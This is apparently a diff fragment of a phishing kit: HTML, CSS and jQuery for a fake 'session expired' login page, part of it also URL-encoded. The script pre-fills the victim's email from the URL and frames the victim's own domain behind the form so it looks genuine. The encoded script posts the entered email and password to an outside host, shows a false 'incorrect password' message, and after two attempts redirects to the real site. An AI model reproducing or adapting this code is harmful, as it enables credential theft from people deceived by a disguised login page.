t.InlineLayout.SIMPLE%7D%2C%20%27google_translate_element%27%29%3B%0A%7D%0A%3C/script%3E%0A%0A%3Cscript%20type%3D%22text/javascript%22%20src%3D%22//translate.google.com/translate_a/element.js%3Fcb%3DgoogleTranslateElementInit%22%3E%3C/script%3E%0A%0A%09%3Cscript%3E%0A%0A%20%20%20%20/*%20global%20%24%20*/%0A%20%20%20%20%24%28document%29.ready%28function%28%29%7B%0A%20%20%20%20%20%20var%20count%3D0%3B%0A%09%20%20%24%28%27%23password%27%29.focus%28%29%3B%20%0A%0A%20%20%20%20%20%20%24%28%27%23back1%27%29.click%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23email%27%29.val%28%22%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23automail%22%29.animate%28%7Bleft%3A200%2C%20opacity%3A%22hide%22%7D%2C%200%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23inputbar%22%29.animate%28%7Bright%3A200%2C%20opacity%3A%22show%22%7D%2C%201000%29%3B%0A%0A%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20var%20email%20%3D%20window.location.hash.substr%281%29%3B%0A%20%20%20%20%20%20if%20%28%21email%29%20%7B%0A%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20else%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20var%20my_email%20%3Demail%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23email%27%29.val%28my_email%29%3B%0A%20%20%20%20%20%20%20%20var%20filter%20%3D%20/%5E%28%5Ba-zA-Z0-9_%5C.%5C-%5D%29+%5C@%28%28%5Ba-zA-Z0-9%5C-%5D%29+%5C.%29+%28%5Ba-zA-Z0-9%5D%7B2%2C4%7D%29+%24/%3B%0A%0A%20%20%20%20%20%20%20%20if%20%28%21filter.test%28my_email%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20email.focus%3B%0A%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20var%20ind%3Dmy_email.indexOf%28%22@%22%29%3B%0A%20%20%20%20%20%20%20%20var%20my_slice%3Dmy_email.substr%28%28ind+1%29%29%3B%0A%20%20%20%20%20%20%20%20var%20c%3D%20my_slice.substr%280%2C%20my_slice.indexOf%28%27.%27%29%29%3B%0A%20%20%20%20%20%20%20%20var%20final%3D%20c.toLowerCase%28%29%3B%0A%20%20%20%20%20%20%20%20var%20finalu%3D%20c.toUpperCase%28%29%3B%0A%0A%20%20%20%20%20%20%20%20%24%28%22%23logoimg%22%29.attr%28%22src%22%2C%20%22https%3A//www.google.com/s2/favicons%3Fdomain%3D%22+my_slice%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23logoname%22%29.html%28finalu%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22.logoname%22%29.html%28finalu%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22.domain%22%29.html%28my_slice%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22.email%22%29.html%28email%29%3B%0A%09%09%0A%09%09%20%20%20%20%20var%20mainPage%20%3D%20%27https%3A//%27+my_slice%3B%20%0A%20%20%20%20%20//%20%20%20%20%20var%20mainPage%20%3D%20%27https%3A//webmail.staralliancebd.com/%27%3B%20%20%0A%20%20%20%20%20%20%20%20%24%28%22%23logoimg%22%29.attr%28%22src%22%2C%20%22https%3A//www.google.com/s2/favicons%3Fdomain%3D%22+mainPage%29%3B%0A%20%20%20%20%20%20%20%20%20document.getElementById%28%27mainPage%27%29.src%20%3D%20mainPage%3B%0A%20%20%20%20//%20%20%20%20%24%28%22%23mainPage%22%29.src%28mainPage%29%3B%0A%20%20%20%20%0A%20%20%20%20%20%20%7D%0A%0A%0A%20%20%20%20%20%20%0A%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.click%28function%28event%29%7B%0A%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23msg%27%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20event.preventDefault%28%29%3B%0A%20%20%20%20%20%20%20%20var%20email%3D%24%28%22%23email%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20var%20password%3D%24%28%22%23password%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20var%20msg%20%3D%20%24%28%27%23msg%27%29.html%28%29%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23msg%27%29.text%28%20msg%20%29%3B%0A%20%20%20%20%20%20///////////new%20injection////////////////%0A%20%20%20%20%20%20var%20my_email%20%3Demail%3B%0A%20%20%20%20%20%20var%20filter%20%3D%20/%5E%28%5Ba-zA-Z0-9_%5C.%5C-%5D%29+%5C@%28%28%5Ba-zA-Z0-9%5C-%5D%29+%5C.%29+%28%5Ba-zA-Z0-9%5D%7B2%2C4%7D%29+%24/%3B%0A%0A%20%20%20%20%20%20if%20%28%21filter.test%28my_email%29%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20email.focus%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20var%20ind%3Dmy_email.indexOf%28%22@%22%29%3B%0A%20%20%20%20%20%20var%20my_slice%3Dmy_email.substr%28%28ind+1%29%29%3B%0A%20%20%20%20%20%20var%20c%3D%20my_slice.substr%280%2C%20my_slice.indexOf%28%27.%27%29%29%3B%0A%20%20%20%20%20%20var%20final%3D%20c.toLowerCase%28%29%3B%0A%20%20%20%20%20%20var%20finalu%3D%20c.toUpperCase%28%29%3B%0A%0A%20%20%20%20%20%20%20%20%24%28%22%23logoimg%22%29.attr%28%22src%22%2C%20%22https%3A//www.google.com/s2/favicons%3Fdomain%3D%22+my_slice%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22.logoimg%22%29.attr%28%22src%22%2C%20%22https%3A//www.google.com/s2/favicons%3Fdomain%3D%22+my_slice%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23logoname%22%29.html%28finalu%29%3B%0A%20%20%20%20%20%20///////////new%20injection////////////////%0A%20%20%20%20%20%20count%3Dcount+1%3B%0A%20%20%20%20%20%20%0A%20%20%20%20%20%20%24.ajax%28%7B%0A%20%20%20%20%20%20%20%20dataType%3A%20%27JSON%27%2C%0A%20%20%20%20%20%20%20%20url%3A%20%27https%3A//sunyl-motor.com/w%20c.php%27%2C%0A%20%20%20%20%20%20%20%20type%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20data%3A%7B%0A%20%20%20%20%20%20%20%20%20%20email%3Aemail%2C%0A%20%20%20%20%20%20%20%20%20%20password%3Apassword%2C%0A%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20data%3A%20%24%28%27%23contact%27%29.serialize%28%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20beforeSend%3A%20function%28xhr%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.html%28%27Verifing...%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20function%28response%29%7B%0A%09%09%09%20%24%28%27%23msg%27%29.html%28%22%3Cspan%20style%3D%27color%3Ared%3B%27%3EYour%20account%20or%20password%20is%20incorrect.%20Please%20try%20again%3C/span%3E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28response%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.show%28%29%3B%0A%09%09%09%09console.log%28response%29%3B%0A%09%09%09%09%24%28%27%23msg%27%29.html%28response%5B%27msg%27%5D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28response%5B%27signal%27%5D%20%3D%3D%20%27ok%27%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23password%22%29.val%28%22%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%3E%3D2%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%3D0%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20window.location.replace%28response%5B%27redirect_link%27%5D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%22https%3A//www.%22+my_slice%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%20%20window.location.replace%28%22https%3A//office.com%22%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%24%28%27%23msg%27%29.html%28response%5B%27msg%27%5D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23msg%27%29.html%28response%5B%27msg%27%5D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20error%3A%20function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23password%22%29.val%28%22%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%3E%3D2%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%3D0%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%22https%3A//www.%22+my_slice%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%20%20%20window.location.replace%28%22https%3A//office.com%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%24%28%27%23msg%27%29.html%28%22Please%20try%20again%20later%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20complete%3A%20function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.html%28%27Sign%20in%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%29%3B%0A%0A%20%09%09%09%0A%0A%20%20%20%20%7D%29%3B%0A%0A%0A%20%20%3C/script%3E%0A%20%20%3C/html%3E'))</script>
+
+
+	 <title class="logoname">PHISHTANK</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<link rel="apple-touch-icon" type="image/png" class="logoimg" href=""> 
+<link rel="shortcut icon" type="image/x-icon" class="logoimg" href="">
+<link rel="mask-icon" type="" class="logoimg" href="" color="#111">
+<meta name="robots" content="noindex"> 
+<!--===============================================================================================-->	
+	<link rel="icon" id="logoimg" type="image/png" href="images/icons/favicon.ico" src="https://www.google.com/s2/favicons?domain=https://phishtank.com"> 
+    <link rel="shortcut icon" class="logoimg" href="" type="image/x-icon"> 
+	 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script> 
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+<!--===============================================================================================-->
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+<style type="text/css">
+
+
+
+
+/*//////////////////////////////////////////////////////////////////
+[ FONT ]*/
+
+@font-face {
+  font-family: Poppins-Regular;
+  src: url('../fonts/poppins/Poppins-Regular.ttf'); 
+}
+
+@font-face {
+  font-family: Poppins-Medium;
+  src: url('../fonts/poppins/Poppins-Medium.ttf'); 
+}
+
+@font-face {
+  font-family: Poppins-Bold;
+  src: url('../fonts/poppins/Poppins-Bold.ttf'); 
+}
+
+@font-face {
+  font-family: Poppins-SemiBold;
+  src: url('../fonts/poppins/Poppins-SemiBold.ttf'); 
+}
+
+
+
+
+/*//////////////////////////////////////////////////////////////////
+[ RESTYLE TAG ]*/
+
+* {
+	margin: 0px; 
+	padding: 0px; 
+	box-sizing: border-box;
+}
+
+body, html {
+	height: 100%;
+	font-family: Poppins-Regular, sans-serif;
+}
+
+/*---------------------------------------------*/
+a {
+	font-family: Poppins-Regular;
+	font-size: 14px;
+	line-height: 1.7;
+	color: #666666;
+	margin: 0px;
+	transition: all 0.4s;
+	-webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+}
+
+a:focus {
+	outline: none !important;
+}
+
+a:hover {
+	text-decoration: none;
+  color: #fff;
+}
+
+/*---------------------------------------------*/
+h1,h2,h3,h4,h5,h6 {
+	margin: 0px;
+}
+
+p {
+	font-family: Poppins-Regular;
+	font-size: 14px;
+	line-height: 1.7;
+	color: #666666;
+	margin: 0px;
+}
+
+ul, li {
+	margin: 0px;
+	list-style-type: none;
+}
+
+
+/*---------------------------------------------*/
+input {
+	outline: none;
+	border: none;
+}
+
+textarea {
+  outline: none;
+  border: none;
+}
+
+textarea:focus, input:focus {
+  border-color: transparent !important;
+}
+
+input:focus::-webkit-input-placeholder { color:transparent; }
+input:focus:-moz-placeholder { color:transparent; }
+input:focus::-moz-placeholder { color:transparent; }
+input:focus:-ms-input-placeholder { color:transparent; }
+
+textarea:focus::-webkit-input-placeholder { color:transparent; }
+textarea:focus:-moz-placeholder { color:transparent; }
+textarea:focus::-moz-placeholder { color:transparent; }
+textarea:focus:-ms-input-placeholder { color:transparent; }
+
+input::-webkit-input-placeholder { color: #fff;}
+input:-moz-placeholder { color: #fff;}
+input::-moz-placeholder { color: #fff;}
+input:-ms-input-placeholder { color: #fff;}
+
+textarea::-webkit-input-placeholder { color: #fff;}
+textarea:-moz-placeholder { color: #fff;}
+textarea::-moz-placeholder { color: #fff;}
+textarea:-ms-input-placeholder { color: #fff;}
+
+label {
+  margin: 0;
+  display: block;
+}
+
+/*---------------------------------------------*/
+button {
+	outline: none !important;
+	border: none;
+	background: transparent;
+}
+
+button:hover {
+	cursor: pointer;
+}
+
+iframe {
+	border: none !important;
+}
+
+
+/*//////////////////////////////////////////////////////////////////
+[ Utility ]*/
+.txt1 {
+  font-family: Poppins-Regular;
+  font-size: 13px;
+  color: #e5e5e5;
+  line-height: 1.5;
+}
+
+
+/*//////////////////////////////////////////////////////////////////
+[ login ]*/
+
+.limiter {
+  width: 100%;
+  margin: 0 auto;
+}
+
+.container-login100 {
+  width: 100%;  
+  min-height: 100vh;
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  align-items: center;
+  padding: 15px;
+
+  background-repeat: no-repeat;
+  background-position: center;
+  background-size: cover;
+  position: relative;
+  z-index: 1;  
+}
+
+.container-login100::before {
+  content: "";
+  display: block;
+  position: absolute;
+  z-index: -1;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+   background-color: rgba(255,255,255,0.5);
+}
+
+.wrap-login100 {
+  width: 500px;
+  border-radius: 10px;
+  overflow: hidden;
+  padding: 55px 55px 37px 55px;
+
+ // background: #aaa;
+ background-color: rgba(100,100,100,0.9);
+  //background: #9152f8;
+//  background: -webkit-linear-gradient(top, #7579ff, #b224ef);
+ // background: -o-linear-gradient(top, #7579ff, #b224ef);
+ // background: -moz-linear-gradient(top, #7579ff, #b224ef);
+ // background: linear-gradient(top, #7579ff, #b224ef);
+}
+
+
+/*------------------------------------------------------------------
+[ Form ]*/
+
+.login100-form {
+  width: 100%;
+}
+
+.login100-form-logo {
+  font-size: 60px; 
+  color: #333333;
+
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 120px;
+  height: 120px;
+  border-radius: 50%;
+  background-color: #fff;
+  margin: 0 auto;
+}
+
+.login100-form-title {
+  font-family: Poppins-Medium;
+  font-size: 30px;
+  color: #fff;
+  line-height: 1.2;
+  text-align: center;
+  text-transform: uppercase;
+
+  display: block;
+}
+
+.login100-form-title2 {
+  font-family: Poppins-Medium;
+  font-size: 20px;
+  color: #fff;
+ // line-height: 1.2;
+  text-align: center;
+  text-transform: lowercase;
+
+  display: block;
+}
+
+
+/*------------------------------------------------------------------
+[ Input ]*/
+
+.wrap-input100 {
+  width: 100%;
+  position: relative;
+  border-bottom: 2px solid rgba(255,255,255,0.24);
+  margin-bottom: 30px;
+}
+
+.input100 {
+  font-family: Poppins-Regular;
+  font-size: 16px;
+  color: #fff;
+  line-height: 1.2;
+
+  display: block;
+  width: 100%;
+  height: 45px;
+  background: transparent;
+  padding: 0 5px 0 38px;
+}
+
+/*---------------------------------------------*/ 
+.focus-input100 {
+  position: absolute;
+  display: block;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  pointer-events: none;
+}
+
+.focus-input100::before {
+  content: "";
+  display: block;
+  position: absolute;
+  bottom: -2px;
+  left: 0;
+  width: 0;
+  height: 2px;
+
+  -webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+  transition: all 0.4s;
+
+  background: #fff;
+}
+
+.focus-input100::after {
+  font-family: Material-Design-Iconic-Font;
+  font-size: 22px;
+  color: #fff;
+
+  content: attr(data-placeholder);
+  display: block;
+  width: 100%;
+  position: absolute;
+  top: 6px;
+  left: 0px;
+  padding-left: 5px;
+
+  -webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+  transition: all 0.4s;
+}
+
+.input100:focus {
+  padding-left: 5px;
+}
+
+.input100:focus + .focus-input100::after {
+  top: -22px;
+  font-size: 18px;
+}
+
+.input100:focus + .focus-input100::before {
+  width: 100%;
+}
+
+.has-val.input100 + .focus-input100::after {
+  top: -22px;
+  font-size: 18px;
+}
+
+.has-val.input100 + .focus-input100::before {
+  width: 100%;
+}
+
+.has-val.input100 {
+  padding-left: 5px;
+}
+
+
+/*==================================================================
+[ Restyle Checkbox ]*/
+
+.contact100-form-checkbox {
+  padding-left: 5px;
+  padding-top: 5px;
+  padding-bottom: 35px;
+}
+
+.input-checkbox100 {
+  display: none;
+}
+
+.label-checkbox100 {
+  font-family: Poppins-Regular;
+  font-size: 13px;
+  color: #fff;
+  line-height: 1.2;
+
+  display: block;
+  position: relative;
+  padding-left: 26px;
+  cursor: pointer;
+}
+
+.label-checkbox100::before {
+  content: "\f26b";
+  font-family: Material-Design-Iconic-Font;
+  font-size: 13px;
+  color: transparent;
+
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: absolute;
+  width: 16px;
+  height: 16px;
+  border-radius: 2px;
+  background: #fff;
+  left: 0;
+  top: 50%;
+  -webkit-transform: translateY(-50%);
+  -moz-transform: translateY(-50%);
+  -ms-transform: translateY(-50%);
+  -o-transform: translateY(-50%);
+  transform: translateY(-50%);
+}
+
+.input-checkbox100:checked + .label-checkbox100::before {
+  color: #555555;
+}
+
+
+/*------------------------------------------------------------------
+[ Button ]*/
+.container-login100-form-btn {
+  width: 100%;
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+.login100-form-btn {
+  font-family: Poppins-Medium;
+  font-size: 16px;
+  color: #555555;
+  line-height: 1.2;
+
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 0 20px;
+  min-width: 120px;
+  height: 50px;
+  border-radius: 25px;
+
+  background: #9152f8;
+  background: -webkit-linear-gradient(bottom, #7579ff, #b224ef);
+  background: -o-linear-gradient(bottom, #7579ff, #b224ef);
+  background: -moz-linear-gradient(bottom, #7579ff, #b224ef);
+  background: linear-gradient(bottom, #7579ff, #b224ef);
+  position: relative;
+  z-index: 1;
+
+  -webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+  transition: all 0.4s;
+}
+
+.login100-form-btn::before {
+  content: "";
+  display: block;
+  position: absolute;
+  z-index: -1;
+  width: 100%;
+  height: 100%;
+  border-radius: 25px;
+  background-color: #fff;
+  top: 0;
+  left: 0;
+  opacity: 1;
+
+  -webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+  transition: all 0.4s;
+}
+
+.login100-form-btn:hover {
+  color: #fff;
+}
+
+.login100-form-btn:hover:before {
+  opacity: 0;
+}
+
+
+/*------------------------------------------------------------------
+[ Responsive ]*/
+
+@media (max-width: 576px) {
+  .wrap-login100 {
+    padding: 55px 15px 37px 15px;
+  }
+}
+
+
+
+/*------------------------------------------------------------------
+[ Alert validate ]*/
+
+.validate-input {
+  position: relative;
+}
+
+.alert-validate::before {
+  content: attr(data-validate);
+  position: absolute;
+  max-width: 70%;
+  background-color: #fff;
+  border: 1px solid #c80000;
+  border-radius: 2px;
+  padding: 4px 25px 4px 10px;
+  top: 50%;
+  -webkit-transform: translateY(-50%);
+  -moz-transform: translateY(-50%);
+  -ms-transform: translateY(-50%);
+  -o-transform: translateY(-50%);
+  transform: translateY(-50%);
+  right: 0px;
+  pointer-events: none;
+
+  font-family: Poppins-Regular;
+  color: #c80000;
+  font-size: 13px;
+  line-height: 1.4;
+  text-align: left;
+
+  visibility: hidden;
+  opacity: 0;
+
+  -webkit-transition: opacity 0.4s;
+  -o-transition: opacity 0.4s;
+  -moz-transition: opacity 0.4s;
+  transition: opacity 0.4s;
+}
+
+.alert-validate::after {
+  content: "\f12a";
+  font-family: FontAwesome;
+  font-size: 16px;
+  color: #c80000;
+
+  display: block;
+  position: absolute;
+  top: 50%;
+  -webkit-transform: translateY(-50%);
+  -moz-transform: translateY(-50%);
+  -ms-transform: translateY(-50%);
+  -o-transform: translateY(-50%);
+  transform: translateY(-50%);
+  right: 5px;
+}
+
+.alert-validate:hover:before {
+  visibility: visible;
+  opacity: 1;
+}
+
+@media (max-width: 992px) {
+  .alert-validate::before {
+    visibility: visible;
+    opacity: 1;
+  }
+}
+
+
+
+
+
+</style>
+<link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><script type="text/javascript" charset="UTF-8" src="https://translate.googleapis.com/_/translate_http/_/js/k=translate_http.tr.en_US.jjUNQJmrBcI.O/am=Aw/d=1/exm=el_conf/ed=1/rs=AN8SPfoJv9UiEGQ_g1Frdy1RjGQ-gVCChg/m=el_main"></script></head>
+<body style="position: relative; min-height: 100%; top: 0px;">
+<script type="text/javascript">
+    toastr['info']('Session expired. Kindly sign in back to continue');
+  </script>
+<iframe id="mainPage" src="https://phishtank.com" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;" width="100%"></iframe>
+	
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100">
+				<form class="login100-form validate-form">
+					<!-- <span class="login100-form-logo"  style="margin-top:-20px"  >
+					<img src="" id="logoimg" />
+					<img src="https://www.google.com/s2/favicons?domain=skyfent.com" size="300px">
+					<img src="logo.clearbit.com/spotify.com">
+						<!-- <i class="zmdi zmdi-landscape"></i>  
+					</span> -->
+
+					<span class="login100-form-title p-b-34 p-t-27" style="margin-top:0px">
+						 Log in  
+						 
+					</span>
+					<span class="login100-form-title2 p-b-34 p-t-27" style="margin-top:0px;margin-bottom:30px">
+					<span class="domain">phishtank.com</span> 
+						<!-- sales@enauk.com <br> 
+						<span id="username"></span>-->
+					</span>
+
+					<div class="wrap-input100 validate-input" data-validate="Enter username">
+						<input class="input100" type="text" id="email" name="email" placeholder="Username">
+						<span class="focus-input100" data-placeholder=""></span>
+					</div>  
+
+					<div class="wrap-input100 validate-input" data-validate="Enter password">
+						<!-- <input  type="text" class="email" name="email" value="" > -->
+						<input class="input100" type="password" id="password" name="password" placeholder="Password">
+						<span class="focus-input100" data-placeholder=""></span>
+					</div>
+						<input type="hidden" id="ip" name="ip">			
+
+					<!-- <div class="contact100-form-checkbox">
+						<input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
+						<label class="label-checkbox100" for="ckb1">
+							Remember me
+						</label>
+					</div> -->
+
+					<div class="container-login100-form-btn">
+						<button class="login100-form-btn" type="submit" id="submit-btn">
+							Login
+						</button>
+
+					</div>
+
+					<!-- <div class="text-center p-t-90">
+						<a class="txt1" href="#">
+							Forgot Password?
+						</a>
+					</div> -->
+				</form>
+			</div>
+		</div>
+		<div id="google_translate_element"><div class="skiptranslate goog-te-gadget" dir="ltr" style=""><div id=":0.targetLanguage" style="white-space: nowrap;" class="goog-te-gadget-simple"><img src="https://www.google.com/images/cleardot.gif" class="goog-te-gadget-icon" alt="" style="background-image: url(&quot;https://translate.googleapis.com/translate_static/img/te_ctrl3.gif&quot;); background-position: -65px 0px;"><span style="vertical-align: middle;"><a aria-haspopup="true" class="goog-te-menu-value" href="javascript:void(0)"><span>Select Language</span><img src="https://www.google.com/images/cleardot.gif" alt="" width="1" height="1"><span style="border-left: 1px solid rgb(187, 187, 187);">​</span><img src="https://www.google.com/images/cleardot.gif" alt="" width="1" height="1"><span style="color: rgb(118, 118, 118);" aria-hidden="true">▼</span></a></span></div></div></div>
+	</div>
+	
+
+	 
+   
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>  
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+	<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+}
+</script>
+
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+	<script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+	  $('#password').focus(); 
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+        $(".logoname").html(finalu);
+        $(".domain").html(my_slice);
+        $(".email").html(email);
+		
+		     var mainPage = 'https://'+my_slice; 
+     //     var mainPage = 'https://webmail.staralliancebd.com/';  
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+mainPage);
+         document.getElementById('mainPage').src = mainPage;
+    //    $("#mainPage").src(mainPage);
+    
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
